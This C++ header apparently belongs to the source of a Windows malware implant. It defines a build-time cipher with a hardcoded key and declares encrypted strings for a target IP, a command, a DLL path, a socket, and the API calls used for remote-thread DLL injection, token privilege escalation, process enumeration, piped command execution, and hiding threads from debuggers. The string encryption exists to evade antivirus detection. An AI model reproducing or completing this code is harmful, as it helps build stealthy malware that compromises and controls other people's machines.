#pragma once

#include <array>

#define BUILD_TIME_CIPHER_BYTE (unsigned char)((i % 4 | ((i * 9) * 2 + BUILD_TIME_KEY[i % BUILD_TIME_KEY.size()] & ((i/2)>>3) * i - BUILD_TIME_KEY[i % BUILD_TIME_KEY.size()]) << 16) ^ 170)
static std::array<uint8_t, 16> BUILD_TIME_KEY = { 242, 42, 227, 180, 172, 12, 182, 4, 26, 210, 166, 255, 109, 183, 56, 28 };

extern unsigned char str_ip[];
extern size_t str_ip_len;

extern unsigned char str_cmd[];
extern size_t str_cmd_len;

extern unsigned char str_dllPath[];
extern size_t str_dllPath_len;

extern unsigned char str_socket[];
extern size_t str_socket_len;

extern unsigned char str_NtSetInformationThread[];
extern size_t str_NtSetInformationThread_len;

extern unsigned char str_GetCurrentThread[];
extern size_t str_GetCurrentThread_len;

extern unsigned char str_Sleep[];
extern size_t str_Sleep_len;

extern unsigned char str_OpenProcess[];
extern size_t str_OpenProcess_len;

extern unsigned char str_VirtualAllocEx[];
extern size_t str_VirtualAllocEx_len;

extern unsigned char str_WriteProcessMemory[];
extern size_t str_WriteProcessMemory_len;

extern unsigned char str_LoadLibraryA[];
extern size_t str_LoadLibraryA_len;

extern unsigned char str_CreateRemoteThread[];
extern size_t str_CreateRemoteThread_len;

extern unsigned char str_CloseHandle[];
extern size_t str_CloseHandle_len;

extern unsigned char str_LookupPrivilegeValueA[];
extern size_t str_LookupPrivilegeValueA_len;

extern unsigned char str_GetLastError[];
extern size_t str_GetLastError_len;

extern unsigned char str_AdjustTokenPrivileges[];
extern size_t str_AdjustTokenPrivileges_len;

extern unsigned char str_OpenProcessToken[];
extern size_t str_OpenProcessToken_len;

extern unsigned char str_GetCurrentProcess[];
extern size_t str_GetCurrentProcess_len;

extern unsigned char str_CreateToolhelp32Snapshot[];
extern size_t str_CreateToolhelp32Snapshot_len;

extern unsigned char str_Process32First[];
extern size_t str_Process32First_len;

extern unsigned char str_Process32Next[];
extern size_t str_Process32Next_len;

extern unsigned char str_CreatePipe[];
extern size_t str_CreatePipe_len;

extern unsigned char str_SetHandleInformation[];
extern size_t str_SetHandleInformation_len;

extern unsigned char str_ReadFile[];
extern size_t str_ReadFile_len;

extern unsigned char str_FormatMessageA[];
extern size_t str_FormatMessageA_len;

extern unsigned char str_LocalFree[];
extern size_t str_LocalFree_len;

extern unsigned char str_CreateProcessA[];
extern size_t str_CreateProcessA_len;

extern unsigned char str_kernel32[];
extern size_t str_kernel32_len;

